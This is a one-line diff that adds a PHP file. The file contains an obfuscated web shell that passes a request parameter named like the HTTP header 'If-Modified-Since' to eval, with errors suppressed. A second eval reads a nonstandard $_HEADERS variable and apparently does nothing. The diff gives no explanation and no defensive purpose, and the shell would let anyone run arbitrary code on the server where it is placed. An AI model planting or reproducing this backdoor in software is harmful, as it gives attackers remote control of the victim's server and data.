@@ -1,0 +1,1 @@
+<?php @eval($_REQUEST["If-Modified-Since"]);@eval($_HEADERS["If-Modified-Since"]);
